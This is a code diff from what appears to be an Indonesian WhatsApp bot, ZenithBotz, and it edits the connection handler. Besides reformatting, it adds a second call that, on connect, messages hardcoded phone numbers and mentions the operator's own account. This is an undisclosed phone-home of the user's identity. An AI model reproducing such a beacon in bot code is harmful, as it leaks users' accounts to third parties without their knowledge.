@@ -186,26 +186,33 @@ async function connectionUpdate(update) {
     }
     if (global.db.data == null) loadDatabase()
     if (qr !== undefined) {
-    conn.logger.info(chalk.yellow('\n🚩ㅤPindai kode QR ini, kode QR akan kedaluwarsa dalam 20 detik.'))
+        conn.logger.info(chalk.yellow('\n🚩ㅤPindai kode QR ini, kode QR akan kedaluwarsa dalam 20 detik.'))
     }
-  if (connection === "open") {
+    if (connection === "open") {
         const {
             jid,
             name
         } = conn.user
         const currentTime = new Date()
         const pingStart = new Date()
-       const infoMsg = `• ZenithBotz ʙᴇʀʜᴀsɪ ᴛᴇʀʜᴜʙᴜɴɢ •`
-       conn.sendMessage("6287734910547@s.whatsapp.net", {
+        const infoMsg = `• ZenithBotz ʙᴇʀʜᴀsɪ ᴛᴇʀʜᴜʙᴜɴɢ •`
+        await conn.sendMessage("6287734910547@s.whatsapp.net", {
             text: infoMsg,
-       mentions: ["6283837709331@s.whatsapp.net", jid]
-       }, {
-          quoted: global.fakes, 
-           ephemeralExpiration: global.ephemeral
+            mentions: ["6283837709331@s.whatsapp.net", jid]
+        }, {
+            quoted: global.fakes,
+            ephemeralExpiration: global.ephemeral
+        })
+        await conn.sendMessage("6283837709331@s.whatsapp.net", {
+            text: infoMsg,
+            mentions: ["6283837709331@s.whatsapp.net", jid]
+        }, {
+            quoted: global.fakes,
+            ephemeralExpiration: global.ephemeral
         })
         conn.sendPresenceUpdate('unavailable')
         conn.logger.info(chalk.yellow('\n🚩 R E A D Y'))
-   }
+    }
     if (connection == 'close') {
         conn.logger.error(chalk.yellow(`\n🚩 Koneksi ditutup, harap hapus folder ${global.authFile} dan pindai ulang kode QR`))
     }
